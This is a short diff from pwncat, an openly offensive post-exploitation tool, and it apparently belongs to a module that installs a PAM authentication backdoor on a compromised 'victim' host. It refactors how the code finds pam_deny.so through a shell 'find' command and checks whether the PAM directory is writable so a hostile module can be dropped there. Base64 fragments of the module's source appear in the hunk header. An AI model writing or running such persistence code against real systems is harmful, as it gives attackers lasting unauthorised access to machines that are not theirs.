@@ -210,17 +210,17 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
 
             # Locate the pam_deny.so to know where to place the new module
             pam_modules = "/usr/lib/security"
-            try:
-                results = (
-                    pwncat.victim.env(["find", "/", "-name", "pam_deny.so"])
-                    .strip()
-                    .decode("utf-8")
+
+            results = (
+                pwncat.victim.run(
+                    "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'"
                 )
-                if results != "":
-                    results = results.split("\n")
-                    pam_modules = os.path.dirname(results[0])
-            except FileNotFoundError:
-                pass
+                .strip()
+                .decode("utf-8")
+            )
+            if results != "":
+                results = results.split("\n")
+                pam_modules = os.path.dirname(results[0])
 
             # Ensure the directory exists and is writable
             access = pwncat.victim.access(pam_modules)
